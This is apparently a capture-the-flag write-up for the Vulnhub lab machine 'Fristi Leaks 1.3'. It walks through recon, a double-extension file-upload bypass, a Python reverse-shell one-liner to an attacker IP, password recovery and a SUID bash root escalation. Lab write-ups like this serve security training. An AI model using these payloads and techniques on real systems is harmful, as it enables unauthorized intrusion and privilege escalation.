# Fristi Leaks 1.3 - Vulnhub

# Recon

## Port / Service scan

`nmap -p- -T4 -sCV 192.168.163.144`

![image.png](image.png)

## Web ( 80 )

### Basic Enumeration

Identifying some technologies

`whatweb http://fristi.local/`

![image.png](images/image%201.png)

More information using a web extension

![image.png](images/image%202.png)

Found the directory `/fristi` that leads to an admin panel

![image.png](images/image%203.png)

We have some base64 data

![image.png](images/image%204.png)

When trying to decode we can see that its an image because of the errors, so decode that into a `.png` file

`echo ‘base64-code’ | base64 -d > image.png`

![image.png](images/image%205.png)

Note: when inspecting the page we got a user

![image.png](images/image%206.png)

`eezeepz:keKkeKKeKKeKkEkkEk`

### Foothold

And we are logged in

![image.png](images/image%207.png)

When we try to upload a simple `.php` file we get an error

![image.png](images/image%208.png)

Once we try double extension technique we can bypass this protection, the named file is `shell.php.jpg`

To execute commands go to

`http://fristi.local/fristi/uploads/shell.php.jpg`

And we received a reverse shell

![image.png](images/image%209.png)

## Privilege Escalation

Inside `/var/www/` we have this `notes.txt` talking about the eezeepz home directory

![image.png](images/image%2010.png)

Another note

![image.png](images/image%2011.png)

It runs commands as admin, so i just injected a python reverse shell into `runthis` file

`echo '/usr/bin/python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.163.135\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"' > /tmp/runthis`

Some interesting base64 code

![image.png](images/image%2012.png)

It seems to be a hash

![image.png](images/image%2013.png)

Doing the inverse of this python code

![image.png](images/image%2014.png)

We get the password

`LetThereBeFristi!`

Now we can login as `frsitigod` user

`sudo -l`

![image.png](images/image%2015.png)

Inside that directory we have the history file and it gives some hints

![image.png](images/image%2016.png)

### Get root

`sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom chmod +s /bin/bash`

Now just run `/bin/bash -p`

![image.png](images/image%2017.png)
